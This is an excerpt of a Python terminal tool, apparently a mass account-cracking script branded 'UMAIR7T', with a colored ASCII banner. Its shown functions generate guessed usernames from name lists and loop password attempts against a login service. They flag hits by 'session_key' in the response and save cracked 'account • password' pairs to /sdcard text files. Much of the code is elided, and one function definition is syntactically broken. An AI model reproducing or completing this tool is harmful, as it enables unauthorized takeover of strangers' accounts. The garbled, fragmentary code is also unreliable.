...
db    db .88b  d88. .88b  d88. d888888b d88888D d888888b 

88    88 88'YbdP`88 88'YbdP`88   `88'   VP  d8' `~~88~~' 

88    88 88  88  88 88  88  88    88       d8'     88    

88    88 88  88  88 88  88  88    88      d8'      88    

88b  d88 88  88  88 88  88  88   .88.    d8'       88    

~Y8888P' YP  YP  YP YP  YP  YP Y888888P d8'        YP    

                                                                             

\033[1;93m______________________________________

\033[1;97m Owner  : UMAIR7T :/

\033[1;97m GitHub : NON :/

\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/

\033[1;97m Status : Free :/

\033[1;97m Notice : Use 10007/10009 For More OK Ids :/
...
def UMMI7T _Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/UMAIR7T-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' UMMI7T -code=UMAIR7T-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','UMMI7T -182^)Code=UMAIR7T-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .UMAIR7T')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.UMAIR7T','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.UMAIR7T', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/UMAIR7T-OK.txt")
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mUMMI7T -M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mUMAIR7T-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/UMAIR7T-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mUMAIR7T-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/UMAIR7T-CP.txt','a').write(f'{acc} • {pword}\n')
    ...
    def start2(user):
      ...
      try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mUMMI7T -M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
